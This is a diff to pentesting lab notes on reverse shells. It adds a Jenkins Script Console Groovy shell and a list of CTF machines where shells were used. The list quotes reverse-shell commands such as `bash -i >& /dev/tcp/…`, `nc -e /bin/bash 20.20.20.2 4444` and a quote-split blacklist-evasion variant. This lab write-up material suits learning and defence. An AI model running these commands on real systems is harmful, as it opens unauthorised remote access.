@@ -37,6 +37,8 @@ PHP:
 
 > The full pentestmonkey PHP reverse shell was uploaded via anonymous FTP → [[web-shell-upload]] in [[anonymous-pingu]].
 
+> Groovy (Jenkins Script Console): a `ProcessBuilder` + socket-loop one-liner runs the shell from the admin panel — full payload on [[jenkins-script-console-rce]].
+
 ## Stabilizing the shell
 
 ```sh
@@ -70,6 +72,6 @@ The payload then points at its *local* neighbor's relay port, and the chain carr
 
 ## Seen in
 
-[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]]), [[littlepivoting]] (`/bin/bash -i >& /dev/tcp/…` over the pivot, pentestmonkey PHP shell on `upload`; manual re-run chained [[socat]] relays back to Kali), [[internal]] (quote-split `ba's'h -c 'bas''h -i >& /dev/tcp/…'` to slip a blacklist — [[waf-bypass]]), [[dark]] (`nc -e /bin/bash 20.20.20.2 4444` fired through a `cmd` POST field — the callback targets the *pivot's* inner IP, so the listener side needs a relay; the writeup doesn't show it), [[rutas]] (`revshell.php` hosted on Kali and pulled in by a [[remote-file-inclusion]] sink — no upload needed, the *server* fetches your payload), [[file]] (pentestmonkey PHP uploaded as `revshell.phar`, triggered with `curl`, caught by `sudo nc -lvnp 4443`)
+[[los-3-hackers]], [[baluhome]], [[ignite]], [[guided-pentest]], [[hannah-coffee]], [[balulero]], [[autoescuela]], [[grooti]], [[walkingcms]], [[anonymous-pingu]], [[trailpack]] (base64 `sh -i` via [[command-injection]]), [[bruteshock]] (nohup `bash -i` via [[shellshock]]), [[littlepivoting]] (`/bin/bash -i >& /dev/tcp/…` over the pivot, pentestmonkey PHP shell on `upload`; manual re-run chained [[socat]] relays back to Kali), [[internal]] (quote-split `ba's'h -c 'bas''h -i >& /dev/tcp/…'` to slip a blacklist — [[waf-bypass]]), [[dark]] (`nc -e /bin/bash 20.20.20.2 4444` fired through a `cmd` POST field — the callback targets the *pivot's* inner IP, so the listener side needs a relay; the writeup doesn't show it), [[rutas]] (`revshell.php` hosted on Kali and pulled in by a [[remote-file-inclusion]] sink — no upload needed, the *server* fetches your payload), [[file]] (pentestmonkey PHP uploaded as `revshell.phar`, triggered with `curl`, caught by `sudo nc -lvnp 4443`), [[jenkhack]] (Groovy `ProcessBuilder` shell fired from the Jenkins Script Console)
 
 > Node inspector tip ([[autoescuela]]): spawn the shell with async `exec()`/`spawn()`, not `execSync()` — the sync form blocks the event loop and freezes the app.
